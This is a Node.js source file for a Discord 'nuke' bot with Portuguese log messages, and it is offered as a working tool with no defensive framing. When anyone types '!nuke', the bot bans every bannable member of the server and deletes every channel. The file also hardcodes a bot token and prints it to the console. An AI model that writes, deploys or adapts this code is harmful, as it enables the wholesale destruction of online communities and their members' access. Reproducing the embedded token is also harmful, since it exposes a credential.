const discord = require("discord.js");
const client = new discord.Client();

const token = "NzMzOTI1ODQzOTAxODc0MTc2.XxKPtA.9VEUnuUysahoa0KNeXWkmAL8ais";

const Botid = "733925843901874176";

const Comando = "!nuke";
console.log("Token: " + token);
console.log("Client id: " + Botid);
console.log("Comando:" + Comando);
client.login(token);
client.on("ready", () => {
  console.log("Bot is ready");
});
client.on("message", (msg) => {
  if (msg.guild) {
    if (msg.content.startsWith(Comando)) {
      msg.guild.members.cache.array().forEach((f) => {
        if (f.user.id != Botid && f.bannable) {
          try {
            f.ban({ reason: "TrollFace" });
            console.log("Banido: " + f.user.username);
          } catch (error) {
            console.log("Erro: Ao banir " + f.user.username);
          }
        }
      });
      msg.guild.channels.cache.array().forEach((f) => {
        try {
          f.delete();
        } catch (error) {
          console.log("Erro: ao excluir o canal " + f.name);
        }
      });
    }
  }
});
